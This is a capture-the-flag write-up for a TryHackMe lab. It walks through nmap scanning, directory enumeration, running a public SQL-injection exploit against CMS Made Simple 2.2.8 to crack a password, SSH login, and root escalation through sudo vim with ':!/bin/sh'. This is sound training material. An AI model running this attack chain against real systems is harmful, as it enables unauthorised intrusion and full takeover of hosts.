# simple-ctf

[Room](https://tryhackme.com/r/room/easyctf)

## How many services are running under port 1000?

A quick nmap can tell us this

```
nmap -sV -p 1-1000 10.10.217.141

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-27 05:24 GMT
Nmap scan report for ip-10-10-217-141.eu-west-1.compute.internal (10.10.217.141)
Host is up (0.00059s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 02:30:43:15:E6:ED (Unknown)
Service Info: OS: Unix

```

## What is running on the higher port?

The temptation is to say that, based on the previous scan, HTTP or Apache is running on the higher port but
this will be incorrect. A new nmap scan is needed

```
nmap 10.10.217.141

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-27 05:31 GMT
Nmap scan report for ip-10-10-217-141.eu-west-1.compute.internal (10.10.217.141)
Host is up (0.00060s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
MAC Address: 02:30:43:15:E6:ED (Unknown)
```

As it can be seen, there is something else running on port 2222. It may be the answer we are looking
for. A more detailed scan to this ports reveals that there is an SSH service running `nmap -sV -p 2222 10.10.217.141`.

## What's the CVE you're using against the application?

Don't be a fool like and think that 'the application' is the SSH service from the previous question. The question
is talking about the thing running in port 80. There is not much to see in the main page. A quick dir enumeration
with gobuster shows a new path `gobuster dir -u 10.10.217.141 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 
` in `/simple`.

If we go to `10.10.217.141/simple`, and look around, it's impossible not to see: `This site is powered by CMS Made Simple version 2.2.8`.
A quick search with searchsploit

```
earchsploit made simple 2.2.8
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection      | php/webapps/46635.py
---------------------------------------------- ---------------------------------
```

Shows what we need.

## What's the password?

Download the exploit-script with `searchsploit -m 46635` and run it with
`python2.7 46635.py -u http://10.10.217.141/simple --crack -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt`.

## Where can you login with the details obtained?

Now we have a user and a password. Where can it be of use? Reading /simple, there is a link to a login page

![](/images/thm/simple-ctf/00.png)

I couldn't find something useful here. Let's try with SSH on port 2222: `ssh -p 2222 mitch@10.10.217.141`. Success!

## What's the user flag?

`ls` on the current dir shows the user flag.

## Is there any other user in the home directory? What's its name?

`cd /home` will tell.

## What can you leverage to spawn a privileged shell?

Enter [GTFOBins](https://gtfobins.github.io/)

> GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
> The project collects legitimate functions of Unix binaries that can be abused to get the f\*\*k break out restricted shells,
> escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

`sudo -ll` will says that the current user, `mitch` can run `vim` as root. A quick search on GTFOBins reveals that vim can be abused
to obtain a shell as [root](https://gtfobins.github.io/gtfobins/vim/). To exploit it

- Run `sudo /usr/bin/vim`
- Do `:!/bin/sh`

Now we have access to a root shell.

## What's the root flag?

Change dir to /root to see it.

# Lessons Learned

- Rediscovered [GTFOBins](https://gtfobins.github.io/).
- Use `vim` as a medium to gain a privileged shell.
- Services may not be running on their standard port!
